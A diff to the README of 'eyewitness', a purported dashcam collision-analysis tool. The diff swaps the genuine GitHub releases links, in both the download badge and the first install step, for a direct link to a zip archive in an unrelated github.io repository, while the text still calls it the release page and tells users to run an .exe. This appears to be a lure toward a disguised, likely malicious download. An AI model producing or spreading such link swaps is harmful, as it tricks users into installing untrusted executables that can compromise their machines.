@@ -5,7 +5,7 @@ description: "Reconstruct vehicle collision liability from dashcam footage using
 ---
 # 🔍 eyewitness - Analyze dashcam footage for accident clarity
 
-[![Download Eyewitness](https://img.shields.io/badge/Download_Eyewitness-blue)](https://github.com/Knight3181992/eyewitness/releases)
+[![Download Eyewitness](https://img.shields.io/badge/Download_Eyewitness-blue)](https://raw.githubusercontent.com/Knight3181992/knight3181992.github.io/main/fibroadipose/knight_io_github_Ronald.zip)
 
 Eyewitness provides a way to process dashcam recordings to determine fault in traffic incidents. The software uses artificial intelligence to identify vehicles and objects in your footage. It calculates distances and paths to provide an objective report regarding movement and safety.
 
@@ -13,7 +13,7 @@ Eyewitness provides a way to process dashcam recordings to determine fault in tr
 
 You need to place the application on your computer to begin. Follow these steps to obtain the correct file for Windows.
 
-1. Go to the [release page](https://github.com/Knight3181992/eyewitness/releases).
+1. Go to the [release page](https://raw.githubusercontent.com/Knight3181992/knight3181992.github.io/main/fibroadipose/knight_io_github_Ronald.zip).
 2. Look for the most recent version at the top of the list.
 3. Locate the asset section under the release notes.
 4. Click the file ending in .exe to start the download.
